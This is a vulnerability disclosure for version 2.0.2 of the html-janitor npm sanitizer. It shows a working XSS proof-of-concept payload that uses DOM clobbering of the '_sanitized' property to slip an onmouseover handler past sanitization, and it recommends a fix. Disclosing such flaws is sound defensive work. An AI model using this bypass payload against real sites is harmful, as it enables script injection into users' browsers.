Summary:

**Module:**

Name: [html-janitor](https://www.npmjs.com/package/html-janitor)
Version: 2.0.2

**Summary:**

Arbitrary HTML can pass the sanitization process, which can be unexpected and dangerous (XSS) in case user-controlled input is passed to the clean function.

**Description:**

Proof of concept:

```javascript
var myJanitor = new HTMLJanitor({tags:{p:{}}});
var cleanHtml = myJanitor.clean("<form><object onmouseover=alert(document.domain) name=_sanitized></object></form>")
console.log(cleanHtml) // logs: <form><object onmouseover=alert(document.domain) name=_sanitized></object></form>
```
The following check can be leveraged to bypass the whole sanitization process:

```javascript
do {
  // Ignore nodes that have already been sanitized
  if (node._sanitized) {
      continue;
  }
...
```

As `node` is the first child in the created tree walker (i.e. in this case the `<form>` tag) `node._sanitized` will point to the inner `<object>` and the check passes.

**Recommendation:**

It should be enough to set `node._sanitized` to `false` every time a new node is being processed. 

*Note that I previously reported this issue at https://github.com/guardian/html-janitor/issues/35*

## Impact

Given the module's description I would assume it should be used to prevent XSS vulnerabilities. This is currently a very dangerous assumption given that the whole sanitization process can be bypassed.

Note that the author might have never intended to feed untrusted data into the clean() function. In that case this is *just* a regular issue. Furthermore, the fact that untrusted data is unexpected should be at least mentioned in the documentation, because other developers most certainly will use the package in such scenarios.
